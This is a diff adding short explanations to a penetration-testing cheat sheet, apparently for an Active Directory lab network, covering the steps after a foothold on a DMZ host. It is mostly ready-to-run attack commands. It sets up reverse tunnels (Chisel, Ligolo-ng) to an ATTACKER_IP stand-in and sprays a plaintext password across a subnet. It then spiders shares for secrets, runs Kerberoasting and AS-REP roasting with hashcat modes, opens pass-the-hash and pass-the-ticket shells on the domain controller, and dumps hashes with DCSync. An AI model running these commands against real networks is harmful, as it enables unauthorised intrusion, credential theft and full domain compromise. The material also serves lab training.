@@ -139,11 +139,13 @@ Once foothold on DMZ01 is achieved:
 # DMZ01 side (after upload):
 ./chisel client ATTACKER_IP:8080 R:1080:socks
 ```
+> Sets up a Chisel reverse SOCKS tunnel: server on the attacker, client on the pivot. Routes proxychains traffic through DMZ01 into the internal subnet. Swap `ATTACKER_IP` and ports for your setup.
 
 ```bash
 # SSH dynamic port forward (if SSH foothold)
 ssh -D 1080 user@DMZ01
 ```
+> Opens a SOCKS proxy on local port 1080 through an SSH session to the pivot. Simplest pivot when you already have SSH on DMZ01. Point proxychains at `127.0.0.1:1080`.
 
 ```bash
 # Ligolo-ng (preferred for AD)
@@ -152,6 +154,7 @@ ssh -D 1080 user@DMZ01
 # Agent on DMZ01:
 ./agent -connect ATTACKER_IP:11601 -ignore-cert
 ```
+> Ligolo-ng tunnel: proxy on the attacker, agent on the pivot. Preferred for AD because it presents a real TUN interface (no proxychains needed). Swap `ATTACKER_IP` for your IP.
 
 ### Proxychains Config
 
@@ -168,6 +171,7 @@ proxychains nxc smb 172.16.119.0/24 -u bjayde -p 'Texas123!@#' --continue-on-suc
 proxychains nxc winrm 172.16.119.0/24 -u bjayde -p 'Texas123!@#'
 proxychains nxc ldap 172.16.119.0/24 -u bjayde -p 'Texas123!@#'
 ```
+> Sprays the reused password across the internal subnet over SMB/WinRM/LDAP through the proxy. `--continue-on-success` finds every host that accepts it. Swap user/password/subnet for your target.
 
 ### Credential Hunting
 
@@ -176,18 +180,21 @@ proxychains nxc ldap 172.16.119.0/24 -u bjayde -p 'Texas123!@#'
 proxychains nxc smb FILE01 -u bjayde -p 'Texas123!@#' --spider-plus
 proxychains nxc smb FILE01 -u bjayde -p 'Texas123!@#' -M spider_plus --content --pattern "passw"
 ```
+> Spiders the file server's shares for secrets; the second command searches file contents for "passw". Change `--pattern` to other keywords (`secret`, `key`) and swap the host for your target.
 
 ### Kerberoasting
 
 ```bash
 proxychains impacket-GetUserSPNs nexura.local/bjayde:'Texas123!@#' -dc-ip 172.16.119.11 -request
 ```
+> Requests TGS tickets for all Kerberoastable SPN accounts and prints crackable hashes. Swap the domain/creds and `-dc-ip` for your target; crack the output with hashcat `-m 13100`.
 
 ### AS-REP Roasting
 
 ```bash
 proxychains impacket-GetNPUsers nexura.local/ -usersfile users.txt -dc-ip 172.16.119.11
 ```
+> Finds users with Kerberos pre-auth disabled and dumps their AS-REP hashes (no password needed). Swap the domain and userlist; crack the output with hashcat `-m 18200`.
 
 ### PtH / PtT Shells
 
@@ -200,6 +207,7 @@ proxychains evil-winrm -i DC01 -u administrator -H <NTLM>
 export KRB5CCNAME=/tmp/admin.ccache
 proxychains impacket-wmiexec -k -no-pass DC01
 ```
+> Gets a shell on DC01 via Pass-the-Hash (psexec/evil-winrm) or Pass-the-Ticket (`-k -no-pass` reads the ccache). Swap the NTLM hash, user, and ccache path for your captured credentials.
 
 ### DCSync
 
@@ -207,6 +215,7 @@ proxychains impacket-wmiexec -k -no-pass DC01
 proxychains impacket-secretsdump -just-dc-user Administrator \
     nexura.local/<user>:<pass>@DC01
 ```
+> DCSyncs the Administrator hash using a privileged account's credentials. Drop `-just-dc-user` to dump the entire domain. Swap the domain/creds for an account with replication rights.
 
 ---
 
